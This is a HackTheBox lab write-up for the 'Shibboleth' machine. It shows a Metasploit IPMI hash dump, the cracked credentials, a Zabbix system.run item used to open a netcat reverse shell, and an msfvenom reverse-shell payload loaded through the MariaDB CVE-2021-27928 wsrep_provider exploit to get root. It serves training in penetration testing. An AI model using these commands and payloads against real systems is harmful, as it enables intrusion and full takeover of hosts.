---
title: Shibboleth writeup
date: 2022-07-09 15:00:00 +0200
categories: [Writeup, HackTheBox]
tags: ["medium-box", "zabbix", "mysql"]     # TAG names should always be lowercase
img_path: /assets/img/boxes/shibboleth/
image: # Thumbnail 
  src: Shibboleth.png
  width: 1000   # in pixels
  height: 400   # in pixels
---

## Summary
This box focused on enumerating an udp port hosting an ipmi service for a hash which, when cracked could be leveraged into logging in to a zabbix service. Rooting the box was relatively straight forward given the mysql version, which could be used to run a msfvenom payload giving us a reverse shell on the box.

## Foothold
We start out by doing an nmap port scan:

```console
Nmap scan report for 10.129.98.93
Host is up (0.024s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://shibboleth.htb/
Service Info: Host: shibboleth.htb

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.05 seconds
```
Pretty sparse nmap scan, only port open is 80 so lets check it out. 

![](welcome.png)

There doesn't really seem to be anything interesting on this service, so let's try to enumerate some more:

```console
==============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://shibboleth.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/wordlists/dns-top1Million.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2021/11/14 07:52:42 Starting gobuster in VHOST enumeration mode
===============================================================
Found: monitor.shibboleth.htb (Status: 200) [Size: 3686]
Found: monitoring.shibboleth.htb (Status: 200) [Size: 3686]
Found: zabbix.shibboleth.htb (Status: 200) [Size: 3686]    
                                                           
===============================================================
2021/11/14 08:06:17 Finished
===============================================================
```
We have located some more vhosts, and after scanning for udp ports we have also found that udp port 623 is open.
```console
┌──(bitis㉿workstation)-[~/Coding/BitisG.github.io]
└─$ sudo nmap -sU 10.129.77.40                                                                                                                                                                                                        130 ⨯
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-09 22:51 CEST
Nmap scan report for shibboleth.htb (10.129.77.40)
Host is up (0.027s latency).
Not shown: 999 closed udp ports (port-unreach)
PORT    STATE SERVICE
623/udp open  asf-rmcp

Nmap done: 1 IP address (1 host up) scanned in 1088.56 seconds
```
We can try some of the techniques mentioned by [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/623-udp-ipmi#vulnerability-ipmi-authentication-bypass-via-cipher-0)

```console
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

[+] 10.129.77.40:623 - IPMI - Hash found: Administrator:17e8f4d6820100002e44e0d663c64e9712ab045d0316ba036117b573ab45edadd1dc693420597a11a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:8adb88e34ccf6233fc1768d3a6c5ee7822473411
```
Cracking the hash we get the following credentials: `Administrator:ilovepumkinpie1`

We can then add the found vhosts to our hosts file and then visit the zabbix site:

![](zabbix.png)

After logging in we see a dashboard

![](zabbix_dash.png)

We can go to `Configuration > hosts > item > create item` and then create an item with system.run as key. This will run any system commands we give it on the system. If we enter a nc reverse shell and then click `test > Get value and test` we receive a connection from the target system.

```console
┌──(bitis㉿workstation)-[~/htb/Machines/Shibboleth]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.72] from (UNKNOWN) [10.129.76.33] 57796
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=110(zabbix) gid=118(zabbix) groups=118(zabbix)
$ 
```

## Pivot
Once we are logged in as the zabbix user, we notice that two other users are available, one being `ipmi-svc` and the other being `root` of course. If we simply use the ipmi password found earlier we can switch to the `ipmi` user and get the user flag:
```console
$ su ipmi-svc
Password: ilovepumkinpie1
id
uid=1000(ipmi-svc) gid=1000(ipmi-svc) groups=1000(ipmi-svc)
```

## Privilege escalation
To start with, we first check out the zabbix configuration file found under `/etc/zabbix/zabbix_server.conf`:
```console
---SNIP---
### Option: DBUser
#       Database user.
#
# Mandatory: no
# Default:
# DBUser=

DBUser=zabbix

### Option: DBPassword
#       Database password.
#       Comment this line if no password is used.
#
# Mandatory: no
# Default:
DBPassword=bloooarskybluh
---SNIP---
```
Also, the version of mysql contains a critical vulnerability which gives us [command execution](https://packetstormsecurity.com/files/162177/MariaDB-10.2-Command-Execution.html) we can use this to get a reverse shell on the system as root. 

```console
┌──(bitis㉿workstation)-[~/htb/Machines/Shibboleth]
└─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.72 LPORT=4445 -f elf-so -o CVE-2021-27928.so
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf-so file: 476 bytes
Saved as: CVE-2021-27928.so
```
After transferring the file to the target system we simply follow the POC as outlined in the previous link from packet storm.
```console
ipmi-svc@shibboleth:~$ chmod +x CVE-2021-27928.so
chmod +x CVE-2021-27928.so
ipmi-svc@shibboleth:~$ mysql -u zabbix -pbloooarskybluh -e 'SET GLOBAL wsrep_provider="/home/ipmi-svc/CVE-2021-27928.so";'
<wsrep_provider="/home/ipmi-svc/CVE-2021-27928.so";'
ERROR 2013 (HY000) at line 1: Lost connection to MySQL server during query
ipmi-svc@shibboleth:~$ 
```
We then recieve a reverse shell as root:
```console
┌──(bitis㉿workstation)-[~/htb/Machines/Shibboleth]
└─$ nc -lvnp 4445
listening on [any] 4445 ...
connect to [10.10.14.72] from (UNKNOWN) [10.129.76.33] 40496
id
uid=0(root) gid=0(root) groups=0(root)
```
Rooted!